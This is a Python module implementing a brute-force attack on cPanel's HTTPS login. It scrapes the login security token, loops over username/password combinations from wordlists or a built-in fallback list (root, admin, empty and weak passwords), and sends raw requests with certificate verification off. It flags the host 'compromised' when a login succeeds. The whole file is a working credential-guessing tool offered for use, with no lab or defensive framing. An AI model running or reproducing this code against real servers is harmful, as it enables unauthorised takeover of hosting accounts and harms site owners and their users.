"""cPanel brute force extractor — attempts login via cPanel's HTTPS login endpoint."""

import itertools
import os
import re
import socket
import ssl
import urllib.parse

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

FALLBACK_USERNAMES = ['root', 'admin', 'cpanel', 'webmaster']
FALLBACK_PASSWORDS = ['', 'admin', 'password', '123456', 'cpanel']


class CPanelExtractor:
    """Attempts to brute force cPanel login using credentials from wordlists."""

    def __init__(self, ip: str, port: int = 2083, host: str = ''):
        """Initialize with target IP, port and hostname.

        Args:
            ip (str): Target IP address.
            port (int): cPanel HTTPS port, default 2083.
            host (str): Domain name for Host header.
        """
        self.ip = ip
        self.port = port
        self.host = host

    def run(self):
        """Load credentials and attempt cPanel login for each combination.

        Returns:
            dict: Status and any valid credentials found.
        """
        print(f"\n  [cPanel] Targeting {self.host}:{self.port}")
        result = {'status': 'open', 'credentials': []}

        token = self._get_login_token()
        if not token:
            print(f"  [cPanel] Could not reach login page")
            result['status'] = 'unreachable'
            return result

        credentials = self._load_credentials()
        print(f"  [cPanel] Testing {len(credentials)} combinations...")

        for username, password in credentials:
            status = self._test_credential(username, password, token)
            display = f"{username}:{password if password else '(empty)'}"
            if status == 'success':
                print(f"  [cPanel] *** VALID CREDENTIAL FOUND: {display} ***")
                result['credentials'].append({'user': username, 'password': password, 'status': 'valid'})
                result['status'] = 'compromised'
                return result  # stop on first hit, we have access
            elif status == 'failed':
                print(f"  [cPanel] Invalid: {display}")
            else:
                print(f"  [cPanel] Error testing {display}: {status}")

        return result

    def _get_login_token(self) -> str | None:
        """Fetch the cPanel login page and extract the hidden security token.

        Returns:
            str | None: Token string if found, otherwise None.
        """
        try:
            response = self._https_request('GET', '/login', body=None)
            if not response:
                return None
            match = re.search(r'name=["\']security_token["\'][^>]*value=["\']([^"\']+)["\']', response)
            if match:
                return match.group(1)
            # Some cPanel versions don't use a token — return empty string to proceed
            return ''
        except Exception as e:
            print(f"  [cPanel] Token fetch failed: {e}")
            return None

    def _test_credential(self, username: str, password: str, token: str) -> str:
        """Submit cPanel login form and check response for success indicators.

        Args:
            username (str): cPanel username.
            password (str): Password to test.
            token (str): Security token from login page.

        Returns:
            str: 'success', 'failed', or error message.
        """
        import time
        time.sleep(0.3)

        try:
            params = {
                'user': username,
                'pass': password,
                'goto_uri': '/',
            }
            if token:
                params['security_token'] = token

            body = urllib.parse.urlencode(params)
            response = self._https_request('POST', '/login/', body=body)

            if not response:
                return 'no_response'

            # Success indicators in cPanel response
            if any(indicator in response for indicator in [
                '"status":1',
                '"status": 1',
                'redirect',
                '/frontend/',
                'cpsess',
            ]):
                return 'success'

            return 'failed'

        except Exception as e:
            return str(e)

    def _https_request(self, method: str, path: str, body: str | None) -> str | None:
        """Send a raw HTTPS request to cPanel and return the response body.

        Args:
            method (str): HTTP method ('GET' or 'POST').
            path (str): URL path to request.
            body (str | None): POST body, or None for GET.

        Returns:
            str | None: Response as string, or None on failure.
        """
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

            sock = socket.create_connection((self.ip, self.port), timeout=5)
            sock = ctx.wrap_socket(sock, server_hostname=self.host)

            headers = (
                f"{method} {path} HTTP/1.1\r\n"
                f"Host: {self.host}\r\n"
                f"User-Agent: Mozilla/5.0\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
            )
            if body:
                headers += f"Content-Length: {len(body)}\r\n"
            headers += "Connection: close\r\n\r\n"

            request = headers.encode()
            if body:
                request += body.encode()

            sock.send(request)

            response = b''
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
            sock.close()

            decoded = response.decode('utf-8', errors='ignore')
            if '\r\n\r\n' in decoded:
                _, _, resp_body = decoded.partition('\r\n\r\n')
                return resp_body
            return decoded

        except Exception:
            return None

    def _load_credentials(self) -> list:
        """Load usernames and passwords from wordlist files and return all combinations.

        Returns:
            list: List of (username, password) tuples.
        """
        wordlists_path = os.path.join(BASE_DIR, '..', '..', '..', 'wordlists')
        usernames = self._load_wordlist(wordlists_path, 'user', FALLBACK_USERNAMES)
        passwords = self._load_wordlist(wordlists_path, 'pass', FALLBACK_PASSWORDS)
        return list(itertools.product(usernames, passwords))

    def _load_wordlist(self, directory: str, keyword: str, fallback: list) -> list:
        """Find and load a wordlist file whose name contains the given keyword.

        Args:
            directory (str): Path to wordlists directory.
            keyword (str): Keyword to match in filename.
            fallback (list): Default list to use if no file found.

        Returns:
            list: Lines from matched file, or fallback list.
        """
        try:
            for filename in os.listdir(directory):
                if keyword.lower() in filename.lower() and filename.endswith('.txt'):
                    filepath = os.path.join(directory, filename)
                    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                        lines = [line.strip() for line in f if line.strip()]
                    print(f"  [cPanel] Loaded {len(lines)} entries from {filename}")
                    return lines
        except FileNotFoundError:
            pass
        print(f"  [cPanel] No wordlist for '{keyword}' — using fallback")
        return fallback
